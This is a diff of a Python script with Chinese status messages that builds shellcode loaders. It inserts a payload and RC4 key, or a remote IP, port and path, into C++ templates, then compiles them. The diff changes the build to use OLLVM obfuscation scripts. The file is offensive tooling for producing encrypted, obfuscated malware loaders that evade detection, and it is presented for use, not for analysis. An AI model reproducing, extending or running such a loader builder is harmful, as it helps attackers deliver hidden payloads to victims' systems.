@@ -1,10 +1,8 @@
 import os
 
-
 def switch_template(template):
     switcher = {
-        "basic": "./src/basic.cpp",
-        "dynamic": "./src/dynamic.cpp",
+        "stdtemp": "./src/stdtemp.cpp",
         "remote": "./src/remote.cpp",
         5: "Case 5"
     }
@@ -18,7 +16,7 @@ def new_loader(template_path, payload,RC4_key):
         file_content = file_content.replace('{{RC4_key}}', RC4_key)
         new_content = file_content.replace('{{payload}}', payload)
 
-        with open("./compile/new_loader.cpp", 'w') as f:
+        with open("./compile/lib/new_loader.cpp", 'w') as f:
             f.write(new_content)
 
         print("[+] new_loader.cpp 文件生成成功")
@@ -33,7 +31,7 @@ def new_loader_remote(template_path, IP,PORT,PATH):
         file_content = file_content.replace('{{IP}}', IP)
         file_content = file_content.replace('{{PORT}}', PORT)
         new_content = file_content.replace('{{PATH}}', PATH)
-        with open("./compile/new_loader.cpp", 'w') as f:
+        with open("./compile/lib/new_loader.cpp", 'w') as f:
             f.write(new_content)
 
         print("[+] new_loader.cpp 文件生成成功")
@@ -41,20 +39,20 @@ def new_loader_remote(template_path, IP,PORT,PATH):
         print(f"错误: {e}")
 
 
-def compilefile(arch,type):
+def compilefile(arch,compiler_type):
     try:
-        if arch == 64 and type == "local":
+        if arch == 64 and compiler_type == 1:
             bat_file = "compile_x64.bat"
-        elif arch == 32 and type == "local":
+        elif arch == 32 and compiler_type == 1:
             bat_file = "compile_x32.bat"
-        elif arch ==64 and type == "remote":
-            bat_file = "compile_x64_remote.bat"
-        elif arch ==32 and type == "remote":
-            bat_file = "compile_x32_remote.bat"
+        elif arch ==64 and compiler_type == 2:
+            bat_file = "compile_ollvm_x64.bat"
+        elif arch ==32 and compiler_type == 2:
+            bat_file = "compile_ollvm_x32.bat"
         directory_path = ".\\compile\\"
         os.chdir(directory_path)
 
-        if not os.path.exists("new_loader.cpp"):
+        if not os.path.exists("lib\\new_loader.cpp"):
             raise FileNotFoundError(f"new_loader.cpp文件不存在")
 
         result = os.system(bat_file)
